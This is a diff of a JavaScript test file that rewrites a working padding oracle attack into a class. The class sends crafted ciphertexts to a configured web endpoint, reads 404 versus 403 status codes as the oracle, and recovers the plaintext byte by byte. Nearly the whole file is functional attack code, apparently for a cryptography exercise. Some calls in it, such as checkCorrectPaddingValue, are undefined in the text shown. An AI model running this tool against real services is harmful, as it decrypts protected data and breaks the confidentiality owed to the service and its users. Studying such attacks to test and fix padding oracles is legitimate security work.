@@ -1,98 +1,208 @@
 const http = require('http');
-const { readFile, writeFile, numberToHex, hexToNumber, xorHexStringToChar, strReplace } = require('./helper');
+const { readFile, writeFile } = require('./helper');
 
 const FOLDER = 'padding-oracle-attack';
 const CONFIG_PATH = `${FOLDER}/data.json`;
 const OUTPUT_PATH = `${FOLDER}/result.json`;
 const BLOCK_SIZE = 32;
+const BLOCK_REG = new RegExp(`.{${BLOCK_SIZE}}`, 'g');
 
 describe('Padding Oracle Attack', () => {
-  let config;
+  let shouldPending = false;
+
   beforeAll(() => {
-    config = readFile(CONFIG_PATH);
     jasmine.DEFAULT_TIMEOUT_INTERVAL = 60 * 60 * 1000;
   });
 
-  it('must return false when send some random cypher', () => {
-    return sendRequest('some-random-cypher')
-      .then((decryptSuccess) => {
-        expect(decryptSuccess).toBeFalse();
-      })
-      .catch((err) => {
-        fail(err.message);
-      });
+  it('should found config file and set up correct', () => {
+    const config = readFile(CONFIG_PATH);
+
+    expect(config).toBeTruthy();
+    expect(config.url).toBeTruthy();
+    expect(config.path).toBeTruthy();
+    expect(config.queryKey).toBeTruthy();
+    expect(config.cypher).toBeTruthy();
+    shouldPending = false;
   });
 
-  it('start!', () => {
-    return paddingOracleAttack(config.cypher, config.decrypted)
-      .then((decrypted) => {
-        const plainText = xorHexStringToChar(
-          decrypted,
-          config.cypher.slice(- BLOCK_SIZE - decrypted.length, - BLOCK_SIZE)
-        );
-        console.log(plainText);
+  it('must get non 404 response status if sending wrong cypher to website', async () => {
+    const config = readFile(CONFIG_PATH);
 
-        expect(plainText.length).toBe((config.cypher.length - BLOCK_SIZE) / 2);
+    try {
+      const attacker = new PaddingOracleAttack(config);
+      const decryptSuccess = await attacker.sendRequest('some-random-cypher');
 
-        writeFile(OUTPUT_PATH, plainText);
-      }).catch((err) => {
-        fail(err.message);
-      });
+      expect(decryptSuccess).toBeFalse();
+      shouldPending = false;
+    } catch (err) {
+      fail(err.message);
+    }
   });
 
-  function paddingOracleAttack(cypher, decrypted = '') {
-    const status = setupStatus(cypher, decrypted);
+  it('start!', async () => {
+    const config = readFile(CONFIG_PATH);
 
-    return new Promise((resolve, reject) => {
-      updateCypherToPadByDecrypted(status);
-      dynamicCheckPadding(status, resolve);
-    });
-  }
+    try {
+      const attacker = new PaddingOracleAttack(config);
+      const decrypted = await attacker.start();
 
-  /**
-   * Padding oracle attack by dynamic programming
-   * @param  {object} status
-   * @param  {func} resolve
-   * @return {void}
-   */
-  function dynamicCheckPadding(status, resolve) {
-    const fakeCypher = strReplace(
-      status.cypher,
-      numberToHex(status.byteValue),
-      status.byteIndex - 2,
+      const plainText = attacker.getPlainText();
+
+      expect(plainText.length).toBe(decrypted.length / 2);
+      writeFile(OUTPUT_PATH, plainText);
+      shouldPending = false;
+    } catch (err) {
+      fail(err.message);
+    }
+  });
+
+  beforeEach(() => {
+    if (shouldPending) {
+      pending('you should handle up the environment');
+    }
+    shouldPending = true;
+  });
+
+  afterAll(() => {
+    if (!shouldPending) {
+      const result = readFile(OUTPUT_PATH);
+      console.log(`\nFound plain text:\n${result}`);
+    }
+  });
+});
+
+class PaddingOracleAttack {
+  constructor(config) {
+    this.initialize(config.cypher, config.decrypted);
+    this.setUpRequest(config.url, config.path, config.queryKey);
+    this.logger = new Logger(
+      this.decrypteds.length * BLOCK_SIZE + this.decrypted.length,
+      (this.cyphers.length - 1) * BLOCK_SIZE,
     );
-
-    sendRequest(fakeCypher)
-      .then((isFound) => {
-        if (isFound) {
-          updateDecryptIfFoundIntegrityError(status);
-        }
-
-        if (status.byteValue % 16 === 0) {
-          process.stdout.clearLine();
-          process.stdout.cursorTo(0);
-          process.stdout.write(`Padding Oracle Attack - total: ${(status.decrypted.length / (config.cypher.length - BLOCK_SIZE) * 100).toFixed(1)}%, current: ${(status.byteValue / 256 * 100).toFixed(0)}%`);
-        }
-        updateStatusIterator(status);
-
-        if (status.isFinish) {
-          resolve(status.decrypted);
-        }
-
-        dynamicCheckPadding(status, resolve);
-      });
   }
 
-  /**
-   * Send request to specific website
-   * @param  {string} cypher
-   * @return {Promise<bool>} wheather reslut is padding correct but invalid integrity
-   */
-  function sendRequest(cypher) {
-    return new Promise((resolve, reject) => {
-      const path = `/${config.path}?${config.queryKey}=${cypher}`;
+  initialize(cypher, decrypted) {
+    decrypted = decrypted ? decrypted : '';
 
-      const request = http.request(config.url, { path }, (response) => {
+    this.cyphers = cypher.match(BLOCK_REG);
+    if (!this.cyphers) {
+      throw new Error('you must give me correct cypher to attack');
+    }
+
+    const doneBlock = Math.floor(decrypted.length / BLOCK_SIZE);
+    this.decrypteds = decrypted.slice(-doneBlock * BLOCK_SIZE).match(BLOCK_REG);
+    this.decrypteds = this.decrypteds ? this.decrypteds : [];
+    this.decrypted = decrypted.slice(0, -doneBlock * BLOCK_SIZE);
+    this.paddingValue = this.decrypted.length / 2 + 1;
+    this.hexIndex = BLOCK_SIZE - this.paddingValue * 2;
+    // 1~cyphers.length-1
+    this.blockStart = this.cyphers.length - this.decrypteds.length - 1;
+    // check correct cypher condition
+    if (this.decrypteds.length === 0 && decrypted) {
+      this.setUpCorrectPad();
+      if (this.paddingValue === this.correctPad) {
+        checkCorrectPaddingValue();
+        this.paddingValue++;
+        this.hexIndex -= 2;
+      }
+    }
+
+    if (decrypted || this.decrypteds.length) {
+      console.log(`Original Message: ${this.getPlainText()}`);
+    }
+  }
+
+  setUpRequest(url, path, queryKey) {
+    this.url = url;
+    this.path = `/${path}?${queryKey}=`;
+  }
+
+  async start() {
+    // 1~cyphers.length - 1
+    for (this.blockIndex = this.blockStart; this.blockIndex; this.blockIndex--) {
+      await this.startCypher();
+
+      console.log(`Current Plain Text: ${this.getPlainText()}\n`);
+
+      this.decrypteds.unshift(this.decrypted);
+      this.decrypted = '';
+    }
+
+    return this.decrypteds.join('');
+  }
+
+  async startCypher() {
+    for (; this.hexIndex >= 0; this.hexIndex -= 2) {
+      await this.startHex();
+
+      this.paddingValue++;
+
+      this.logger.incrementCurrent();
+    }
+    this.hexIndex = BLOCK_SIZE - 2;
+    this.paddingValue = 1;
+
+    return this.decrypted;
+  }
+
+  async startHex() {
+    if (this.blockIndex === this.cyphers.length - 1) {
+      // if it is correct padding we already know what is correct decrypted value!
+      if (this.paddingValue === this.correctPad) {
+        return this.updateByCorrectPaddingValue();
+      }
+    }
+
+    const preNoNeed = '0'.repeat(this.hexIndex);
+    const postPaddedCorrect = '00'.toHex()
+      .xorWith(this.paddingValue)
+      .repeat(this.paddingValue - 1)
+      .toHex()
+      .xorWith(this.decrypted)
+      // post cypher block, must have!
+      .concat(this.cyphers[this.blockIndex]);
+    // console.log(postPaddedCorrect, '-', postPaddedCorrect.length);
+
+    for (let hexValue = 0; hexValue < 256; hexValue++) {
+      if (hexValue % 16 === 0) {
+        this.logger.show(hexValue / 256 * 100);
+      }
+
+      const cypher = preNoNeed
+        .concat(hexValue.toHex())
+        .concat(postPaddedCorrect);
+
+      // if integrity failed, means padding is correct!
+      if (await this.sendRequest(cypher)) {
+        const foundDecrypted = '00'.toHex().xorWith(hexValue ^ this.paddingValue);
+        this.decrypted = foundDecrypted.concat(this.decrypted);
+
+        process.stdout.write(` - found ${foundDecrypted}\n`);
+        break;
+      }
+
+      if (hexValue === 255) {
+        // if not very first time
+        if (this.hexIndex !== BLOCK_SIZE - 2 ||
+          this.blockIndex !== this.cyphers.length - 1) {
+          throw new Error(`Not found in block: ${this.blockIndex}, hex: ${this.hexIndex}`);
+        } else {
+          this.correctPad = 1;
+        }
+      }
+    }
+
+    // try get correct padding value on original cypher to ignore correct padding
+    if (!this.correctPad) {
+      this.setUpCorrectPad();
+    }
+  }
+
+  sendRequest(cypher) {
+    return new Promise((resolve, reject) => {
+      const path = `${this.path}${cypher}`;
+
+      const request = http.request(this.url, { path }, (response) => {
         // if padding success but wrong integrity return 404, else return 403
         resolve(response.statusCode === 404);
       });
@@ -103,137 +213,47 @@ describe('Padding Oracle Attack', () => {
     });
   }
 
-  /**
-   * If find decrypted cypher by attack, update status
-   * @param  {object} status
-   * @return {void}
-   */
-  function updateDecryptIfFoundIntegrityError(status) {
-    const foundDecrypted = numberToHex(status.byteValue ^ status.paddingValue);
-    status.decrypted = foundDecrypted.concat(status.decrypted);
-    status.byteValue = -1;
-
-    // try get correct padding value on original cypher to ignore correct padding
-    if (!status.correctPad) {
-      status.correctPad = getCorrectCypherPad(status.cypher, status.decrypted);
-    }
-
-    process.stdout.write(` - found ${foundDecrypted}\n`);
+  setUpCorrectPad() {
+    this.correctPad = this.cyphers.slice(-2)[0]
+      .toHex(BLOCK_SIZE / 2 -1)
+      .xorWith(this.decrypted.substr(-2))
+      .toHex().num[0];
   }
 
-  /**
-   * Update byte value to attack and index of byte if need
-   * @param  {object}  status
-   * @param  {Boolean} isFound if is found reset index of byte (start new round of attack)
-   * @return {void}
-   */
-  function updateStatusIterator(status, isFound) {
-    if (++status.byteValue === 0) {
-      status.byteIndex -= 2;
-      status.paddingValue++;
+  updateByCorrectPaddingValue() {
+    const correctDecrypted = this.cyphers.slice(-2)[0]
+      .toHex(BLOCK_SIZE / 2 - this.correctPad)
+      .xorWith(this.correctPad);
+    console.log(`correct padding value decrypted is: ${correctDecrypted}`);
 
-      // ignore correct padding value
-      if (!status.isCheckedCorrectPad && status.paddingValue === status.correctPad) {
-        status.byteIndex -= 2;
-        status.paddingValue++;
-        status.decrypted = getDecryptedByCorrectCypherPad(status.cypher, status.decrypted, status.correctPad);
-        status.isCheckedCorrectPad = true;
-      }
-
-      updateCypherToPadByDecrypted(status);
-    } else if (status.byteValue === 256) {
-      throw new Error(`\ncannot find decrypted in ${status.byteIndex}`);
-    }
-
-    if (status.paddingValue === 17) {
-      status.paddingValue = 1;
-      status.cypher = status.original_cypher.substr(0, status.cypher.length - BLOCK_SIZE);
-      updateCypherToPadByDecrypted(status);
-    }
-
-    if (status.byteIndex === 0) {
-      status.isFinish = true;
-    }
+    this.decrypted = correctDecrypted.concat(this.decrypted);
   }
 
-  /**
-   * Add padding value on decrypted cypher and get expect cypher to next round of attack
-   * @param  {object} status
-   * @return {void}
-   */
-  function updateCypherToPadByDecrypted(status) {
-    // no need to change in first time
-    if (status.decrypted === '') {
-      return;
-    }
+  getPlainText() {
+    const decrypted = this.decrypted.concat(this.decrypteds.join(''));
+    const cyphers = this.cyphers.slice(0, -1).join('').substr(-decrypted.length);
+    return decrypted.toHex()
+      .xorWith(cyphers)
+      .toHex().toChar().join('')
+      .slice(0, -this.correctPad);
+  }
+}
 
-    const paddingHex = numberToHex(status.paddingValue);
-    const expectDecrypted = paddingHex.repeat(status.paddingValue - 1);
-    const expectCypher = xorHexStringToChar(status.decrypted, expectDecrypted, true);
-    // console.log(paddingHex, ' -  ', expectDecrypted, ' - ', expectCypher);
-
-    status.cypher = status.cypher.slice(0, - BLOCK_SIZE - expectCypher.length)
-      .concat(expectCypher)
-      .concat(status.cypher.substr(status.cypher.length - BLOCK_SIZE));
+class Logger {
+  constructor(current, total) {
+    this.total = total;
+    this.current = current;
   }
 
-  /**
-   * Get padding value directly from cypher and decrypted cypher
-   *   result is original padding on cypher
-   *
-   * @param  {string} cypher    original cypher
-   * @param  {string} decrypted decrypted by padding oracle attack
-   * @return {string}           correct padding value
-   */
-  function getCorrectCypherPad(cypher, decrypted) {
-    return  hexToNumber(xorHexStringToChar(
-      cypher.substr(cypher.length - BLOCK_SIZE - 2, 2),
-      decrypted.substr(-2),
-      true,
-    ));
+  incrementCurrent() {
+    this.current += 2;
   }
 
-  /**
-   * If cypher is already correct in specific padding
-   *   ignore it by adding decrypted directly by padding and correct cypher
-   *
-   * @example
-   * cypher: ... aeb2
-   * plain text: ... 0202
-   * decrypted: ... acb0
-   *
-   * @param  {string} cypher     correct cypher
-   * @param  {string} decrypted  decrypted cypher
-   * @param  {number} correctPad correct padding on correct cypher
-   * @return {string}            new decrypted cypher
-   */
-  function getDecryptedByCorrectCypherPad(cypher, decrypted, correctPad) {
-    return xorHexStringToChar(
-      numberToHex(correctPad),
-      cypher.substr(cypher.length - BLOCK_SIZE - decrypted.length - 2, 2),
-      true,
-    ).concat(decrypted);
+  show(local) {
+    process.stdout.clearLine();
+    process.stdout.cursorTo(0);
+
+    const pertentage = (this.current / this.total * 100).toFixed(1);
+    process.stdout.write(`Padding Oracle Attack - total: ${pertentage}%, current: ${local.toFixed(0)}%`);
   }
-
-  function setupStatus(cypher, decrypted) {
-    let correctPad = decrypted ? getCorrectCypherPad(cypher, decrypted) : 0;
-    if (correctPad && decrypted.length === (correctPad - 1) * 2) {
-      decrypted = getDecryptedByCorrectCypherPad(cypher, decrypted, correctPad);
-    }
-
-    const cypherUnused = Math.floor(decrypted.length / BLOCK_SIZE) * BLOCK_SIZE;
-    const paddingValue = (decrypted.length / 2 + 1) % 16;
-
-    return {
-      isFinish: false,
-      decrypted,
-      paddingValue: paddingValue ? paddingValue : 16,
-      byteIndex: cypher.length - BLOCK_SIZE - decrypted.length,
-      byteValue: 0,
-      cypher: cypher.slice(0, cypherUnused ? - cypherUnused : cypher.length),
-      correctPad,
-      isCheckedCorrectPad: Boolean(correctPad),
-      original_cypher: cypher,
-    };
-  }
-});
+}
